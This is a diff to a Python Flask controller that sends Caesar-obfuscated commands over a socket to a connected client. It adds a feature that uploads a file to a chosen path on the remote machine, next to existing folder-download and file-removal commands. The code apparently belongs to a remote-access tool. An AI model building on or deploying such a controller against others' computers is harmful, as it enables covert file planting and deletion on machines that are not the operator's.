@@ -139,13 +139,9 @@ def recv_folder(client, path, addr, i) :
         
         else :
             recv_folder(client, path + "/" + f, addr, i + "\\" + f)
-        """
-        #call download folder
-        client.send(CAESAR("download_dir\0").encode())
 
-        client.send(CAESAR(path + "\0").encode())
-        """
-                    
+def upload_file(fp, sock):
+    sock.send(fp.read())
 
 app = Flask(__name__) 
 # Disable Flask's default logging
@@ -211,7 +207,15 @@ def interact() :
                 return 'no file selected'
 
             print(f"{filename} --> {path_file_ex_2}")
+            
+            client.send(CAESAR("upload_file\0").encode())
+            
+            file_parts = filename.split('\\') 
+            client.send(CAESAR(path_file_ex_2 + file_parts[len(file_parts)-1] + "\0").encode())
 
+            fp = open(filename, "rb")
+            upload_file(fp, client)
+            
         case "remove" :
             for i in files :
                 path = path_file_ex_2 + i
